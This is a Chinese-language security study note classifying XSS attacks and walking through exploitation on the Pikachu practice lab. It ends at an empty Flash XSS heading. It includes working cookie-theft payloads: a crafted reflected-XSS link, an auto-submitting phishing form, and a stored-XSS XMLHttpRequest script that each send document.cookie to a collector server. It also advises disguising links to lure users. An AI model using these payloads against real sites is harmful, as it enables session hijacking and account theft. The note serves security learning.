---
description: 本笔记整理自互联网并尽可能的给出参考链接，如有侵权，请联系我删除。
---

# XSS攻击分类与简单利用

传统意义上我们会将XSS分类成反射型XSS，存储型XSS，DOM型XSS，但这样的分类并不准确。因为XSS存在不同的分类依据，严格意义上来说，我们可将XSS可以按下图进行分类。

![XSS&#x5206;&#x7C7B;](.gitbook/assets/image%20%2890%29.png)

## 一、反射型XSS（按形式分类）

### **什么是反射型XSS？** 

反射型XSS是非持久化的，需要欺骗用户点击链接才能触发XSS攻击代码，因其需交互的特征更易被防御。

### **反射型XSS的分类** 

1、反射型XSS\(GET）： 

输入的恶意代码通过GET传递，并直接在网页中触发

![&#x5F53;&#x63D0;&#x4EA4;&#x5B57;&#x7B26;&#x4E32;test&#x65F6;&#xFF0C;&#x4F1A;&#x76F4;&#x63A5;&#x5199;&#x5165;&#x5230;&#x7F51;&#x9875;&#x4E2D;](.gitbook/assets/image%20%2843%29.png)

![&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7684;&#x63D0;&#x4EA4;&#x4E00;&#x4E2A;JS&#x4EE3;&#x7801;&#x6765;&#x89E6;&#x53D1;&#x5F39;&#x7A97;](.gitbook/assets/image%20%2836%29.png)

2、反射型XSS\(POST\)：

 输入的恶意代码通过POST传递，并直接在网页中触发，相比GET传参更加隐秘

![POST&#x63D0;&#x4EA4;&#x6846;](.gitbook/assets/image%20%2882%29.png)

![&#x89E6;&#x53D1;&#x6F0F;&#x6D1E;](.gitbook/assets/image%20%2862%29.png)

3、GET与POST反射型XSS的区别

* GET方式可以直接使用带有恶意代码的链接来实现如窃取用户COOKIE等XSS攻击，但链接需要进行伪装，避免被用户发现。
* POST方式需要攻击者在钓鱼服务器上架设自动POST页面来实现如窃取COOKIE等XSS攻击，相比GET方式更加隐蔽，用户不易察觉。

### **反射型XSS的简单利用:以窃取用户COOKIE为例** 

诱骗被攻击者点击存在XSS攻击代码的链接，触发攻击代码，进行攻击。 

1、GET方式 

准备用于接收COOKIE的服务器（这里使用了pikachu的XSS后台）

![&#x5C06;&#x94FE;&#x63A5;&#x91CD;&#x5B9A;&#x5411;&#x56DE;&#x539F;&#x9875;&#x9762;&#xFF0C;&#x907F;&#x514D;&#x7528;&#x6237;&#x53D1;&#x89C9;&#x5F02;&#x5E38; ](.gitbook/assets/image%20%2844%29.png)

构造含恶意代码的链接：

`localhost:8080/vul/xss/xss_reflected_get.php?message=document.location = &apos;<a href="http://localhost:2333/pkxss/xcookie/cookie.php?cookie=">http://localhost:2333/pkxss/xcookie/cookie.php?cookie=</a>&apos; + document.cookie;&submit=submit` 

PAYLOAD分析:

`document.location = &apos;<a href="http://localhost:2333/pkxss/xcookie/cookie.php?cookie=">http://localhost:2333/pkxss/xcookie/cookie.php?cookie=</a>&apos; + document.cookie; //将COOKIE发送给恶意服务器`

诱导用户点击后，就能收到用户的COOKIE信息

![](.gitbook/assets/image%20%289%29.png)

2、POST方式 

准备用于接收COOKIE的服务器（这里使用了pikachu的XSS后台） 

在钓鱼服务器上创建一个带有表单自动post功能的页面，例如：

```text
<html>
<head>
    <script>
	    window.onload = function() {document.getElementById("postsubmit").click();}
        //触发表单自动提交
    </script>
</head>
<body>
    <form method="post" action="http://localhost:8080/vul/xss/xsspost/xss_reflected_post.php">
        //表单提交到存在xss漏洞的页面
        <input id="xssr_in" type="text" name="message" 
            value="<script>
                document.location = 'http://localhost:2333/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
	        </script>"
            //XSS攻击代码，获取当前登录账户的COOKIE
	    />
        <input id="postsubmit" type="submit" name="submit" value="submit" />
    </form>
</body>
</html>

```

诱导用户在登录状态下去点击钓鱼页面，就可以获取到COOKIE

![](.gitbook/assets/image%20%2897%29.png)

## **二、存储型XSS（按形式分类）**

### **什么是存储型XSS？** 

存储型XSS是持久的，恶意代码存储在网站服务器之中，任何用户的访问都会触发恶意代码的执行，进行蠕虫攻击，危害较大，隐蔽性较好。常见于没有进行严格过滤的留言板等可以进行数据提交的页面。

![&#x4E00;&#x4E2A;&#x5B58;&#x5728;XSS&#x6F0F;&#x6D1E;&#x7684;&#x7559;&#x8A00;&#x677F;](.gitbook/assets/image%20%286%29.png)

![&#x6BCF;&#x6B21;&#x5BF9;&#x7559;&#x8A00;&#x677F;&#x754C;&#x9762;&#x7684;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x89E6;&#x53D1;&#x653B;&#x51FB;&#x4EE3;&#x7801;](.gitbook/assets/image%20%2835%29.png)



### **存储型XSS的简单利用:以窃取用户COOKIE为例** 

准备一个用于接收COOKIE的服务器（这里使用了pikachu的XSS后台）

![](.gitbook/assets/image%20%2861%29.png)

构建获取COOKIE的恶意代码

```text
<script>
    var url='http://localhost:2333/pkxss/xcookie/cookie.php';
    var data='cookie='+document.cookie;
    var xhr= new XMLHttpRequest();
    xhr.open('POST',url);
    xhr.setRequestHeader('content-type','application/x-www-form-urlencoded');
    xhr.send(data);
</script>
```

JS模拟POST请求，将用户的COOKIE发送出去

![](.gitbook/assets/image%20%2837%29.png)

每次访问都会自动的将COOKIE发送

![](.gitbook/assets/image%20%282%29.png)

## **三、DOM型XSS（按接口分类）**

### **什么是DOM型XSS？**

 DOM型XSS漏洞基于DOM文档对象模型，此型XSS通过DOM的特性来动态修改页面代码。DOM型XSS也可以分为反射型与存储型。 

存储型：

![](.gitbook/assets/image%20%2857%29.png)

反射型：

![](.gitbook/assets/image%20%2889%29.png)

### **什么是DOM？** 

DOM是一个树状模型，可以使用JAVASCRIPT代码根据一层层节点来遍历/获取/修改对应的节点，对象，值。 

### **DOM型XSS简单利用**

进行输入测试，用开发者工具观察页面变化

![&#x6211;&#x4EEC;&#x8F93;&#x5165;&#x7684;test&#x88AB;&#x4F20;&#x5165;&#x4E86;a&#x6807;&#x7B7E;&#x7684;href&#x4E2D;&#xFF0C;&#x5B58;&#x5728;DOM XSS](.gitbook/assets/image%20%2840%29.png)

![&#x53EF;&#x4EE5;&#x4F7F;&#x7528;JAVASCRIPT&#x4F2A;&#x534F;&#x8BAE;&#x8FDB;&#x884C;XSS&#x653B;&#x51FB;](.gitbook/assets/image%20%2895%29.png)



## **四、非DOM型XSS（按接口分类）**

### **什么是非DOM型XSS?** 

并不依赖DOM特性来实现XSS攻击的XSS属于非DOM型XSS。

## **五、JSXSS（按介质分类）**

### **什么是JS XSS?** 

基于JS进行执行的XSS漏洞属于JS XSS类型。

## **六、FLASHXSS（按介质分类）**

_Adobe 正式宣布将在 2020 年停止支持 Flash（_~~_十有八九和XP一样死而不僵_~~_）_

### **什么是FLASH XSS?** 

FLASH是使用ActionScript所开发的Base on ECMAScript,如果开发者没有进行输入过滤或存在敏感函数，就可以执行任意JAVASCRIPT。

### **FLASH XSS攻击流程**

![](.gitbook/assets/image%20%2827%29.png)

### **FLASH XSS的简单利用：以敏感函数为例**

